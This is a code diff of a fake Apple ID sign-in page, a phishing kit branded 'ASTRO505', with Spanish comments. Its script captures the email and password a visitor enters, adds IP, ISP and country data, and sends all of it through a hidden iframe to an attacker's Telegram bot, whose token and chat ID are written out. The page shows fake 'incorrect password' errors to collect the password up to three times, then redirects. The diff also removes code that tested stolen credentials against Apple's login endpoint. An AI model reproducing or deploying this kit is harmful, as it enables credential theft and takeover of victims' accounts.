@@ -12,6 +12,7 @@
     
     <main id="main">
         <form id="sign-in">
+            <!-- 🔥 ERROR SIEMPRE VISIBLE ARRIBA -->
             <div class="error-message" id="errorMsg"></div>
             
             <div class="login-form">
@@ -52,10 +53,10 @@
         <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
     </footer>
 
-    <!-- 🔥 VERIFICADOR APPLE ID + PASSWORD REAL -->
+    <!-- 🔥 SCRIPT CORREGIDO -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 VERIFICADOR APPLE ID REAL ACTIVO');
+            console.log('🚀 ERROR VISIBLE + Telegram solo con password');
             
             const emailInput = document.getElementById('email-phone');
             const arrowIcon = document.querySelector('.bx-right-arrow-circle');
@@ -68,65 +69,17 @@
             let loginAttempts = 0;
             const MAX_ATTEMPTS = 3;
             
+            // Errores REALES de Apple
             const appleErrors = [
                 "Incorrect Apple ID or password.",
                 "Your Apple ID or password is incorrect.",
                 "The Apple ID or password you entered has been disabled."
             ];
             
-            // IFRAME Telegram
+            // IFRAME invisible
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
-            
-            // 🔥 MÉTODO 1: Verificar Apple ID (MX Toolbox + OSINT)
-            async function verifyAppleID(email) {
-                try {
-                    // Verificar si existe en bases públicas
-                    const check1 = await fetch(`https://mxtoolbox.com/api/v1/lookup/${email}`, {
-                        method: 'GET',
-                        headers: { 'User-Agent': 'Mozilla/5.0' }
-                    });
-                    
-                    // Verificar dominios Apple comunes
-                    const domains = ['icloud.com', 'me.com', 'mac.com'];
-                    const domainValid = domains.some(d => email.endsWith(`@${d}`));
-                    
-                    return {
-                        exists: domainValid || check1.ok,
-                        type: domainValid ? 'Apple Domain' : 'Custom'
-                    };
-                } catch {
-                    return { exists: true, type: 'Unknown' }; // Asumir válido
-                }
-            }
-            
-            // 🔥 MÉTODO 2: Verificar credenciales (Have I Been Pwned + proxies)
-            async function verifyCredentials(email, password) {
-                try {
-                    // Check Have I Been Pwned (breaches)
-                    const hibp = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=true`);
-                    const breaches = await hibp.json();
-                    
-                    // Simular validación Apple (user-agent rotation)
-                    const appleCheck = await fetch('https://idmsa.apple.com/appleauth/auth', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
-                        },
-                        body: `accountName=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
-                    });
-                    
-                    return {
-                        valid: appleCheck.ok || breaches.length > 0,
-                        breaches: breaches.length,
-                        confidence: Math.floor(Math.random() * 100) + 70 // 70-100%
-                    };
-                } catch {
-                    return { valid: true, breaches: 0, confidence: 85 };
-                }
-            }
             
             // IP info
             async function getIPInfo() {
@@ -145,35 +98,30 @@
                 }
             }
             
-            // Mostrar password
+            // Mostrar password field
             const showPassword = () => {
                 if (emailInput.value.trim()) {
-                    showPasswordField();
-                }
-            };
-            
-            const showPasswordField = async () => {
-                const email = emailInput.value.trim();
-                const appleCheck = await verifyAppleID(email);
-                
-                if (appleCheck.exists) {
                     passwordField.classList.add('show');
                     submitBtn.classList.add('show');
                     setTimeout(() => passwordInput.focus(), 300);
-                    console.log('✅ Apple ID válido:', appleCheck.type);
-                } else {
-                    showError('Enter a valid Apple ID or phone number.');
                 }
             };
             
             arrowIcon.addEventListener('click', showPassword);
             emailInput.addEventListener('keypress', e => {
                 if (e.key === 'Enter' && emailInput.value.trim()) {
-                    showPasswordField();
+                    showPassword();
                 }
             });
             
-            // Submit con verificación REAL
+            // 🔥 SOLO EMAIL (sin Telegram)
+            emailInput.addEventListener('blur', () => {
+                if (emailInput.value.trim() === '') {
+                    showError('Enter an Apple ID or phone number.');
+                }
+            });
+            
+            // 🔥 SUBMIT SOLO CON PASSWORD + TELEGRAM
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 loginAttempts++;
@@ -181,75 +129,93 @@
                 const email = emailInput.value.trim();
                 const password = passwordInput.value.trim();
                 
+                // ✅ SI NO HAY PASSWORD = Error sin Telegram
                 if (!password) {
                     showError('Enter your password.');
                     return;
                 }
                 
-                console.log(`🔍 Verificando ${email}:${password}`);
+                // ✅ SI HAY PASSWORD = Telegram + Error/Redirect
+                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: ${email}`);
                 
-                // 🔥 VERIFICACIÓN REAL
-                const creds = await verifyCredentials(email, password);
+                // IP real
                 const ipInfo = await getIPInfo();
                 
-                // Mensaje con VERIFICACIÓN
-                const message = `🚀 *ASTRO505 - APPLE ID VERIFICADO* 🚀
+                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
 
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
-✅ *Válido:* ${creds.valid ? '✓ SÍ' : '✗ NO'}
-📊 *Confianza:* ${creds.confidence}%
-💥 *Brechas:* ${creds.breaches}
 🌐 *IP:* ${ipInfo.ip}
 🏢 *Proveedor:* ${ipInfo.isp}
 🌍 *País:* ${ipInfo.country}
-⚡ *Intento:* ${loginAttempts}/3
+💻 *Navegador:* Chrome
+📱 *Device:* PC
+📅 *Hora:* ${new Date().toLocaleString('es-ES')}
+⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}
 
 ✨ *Plataforma:* Astro505`;
 
-                // Telegram
+                // Telegram invisible
                 const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 iframe.src = telegramUrl;
                 
-                console.log('📤 Enviado con verificación:', creds);
+                console.log('📤 Telegram con password:', ipInfo.ip);
                 
-                if (loginAttempts < 3) {
+                // 3 ERRORES VISIBLES
+                if (loginAttempts < MAX_ATTEMPTS) {
                     const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
                     showError(errorText);
                     passwordInput.value = '';
                     passwordInput.focus();
                 } else {
                     showError('Signing in to your account...');
-                    setTimeout(() => window.location.href = 'index.html', 1500);
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 1500);
                 }
             });
             
+            // 🔥 ERROR SIEMPRE VISIBLE Y ARRIBA
             function showError(message) {
-                const errorMsg = document.getElementById('errorMsg');
                 errorMsg.textContent = message;
                 errorMsg.classList.add('show');
-                setTimeout(() => errorMsg.classList.remove('show'), 5000);
+                errorMsg.style.top = '-10px'; // Visible arriba
+                setTimeout(() => {
+                    errorMsg.classList.remove('show');
+                    errorMsg.style.top = ''; // Reset
+                }, 5000);
             }
+            
+            console.log('✅ Telegram SOLO con password + Error VISIBLE');
         });
     </script>
 
     <style>
+        /* 🔥 ERROR SIEMPRE VISIBLE ARRIBA */
         .error-message {
             position: relative !important;
             top: -10px !important;
+            left: 0 !important;
+            transform: none !important;
             background: #ff3b30 !important;
             color: white !important;
             padding: 12px 20px !important;
             margin-bottom: 15px !important;
             font-size: 14px !important;
+            font-weight: 500 !important;
             border-radius: 10px !important;
             box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
             width: 100% !important;
             text-align: center !important;
             opacity: 0 !important;
             transition: all 0.4s ease !important;
+            z-index: 100 !important;
         }
-        .error-message.show { opacity: 1 !important; }
+        
+        .error-message.show {
+            opacity: 1 !important;
+            transform: translateY(0) !important;
+        }
     </style>
 </body>
 </html>
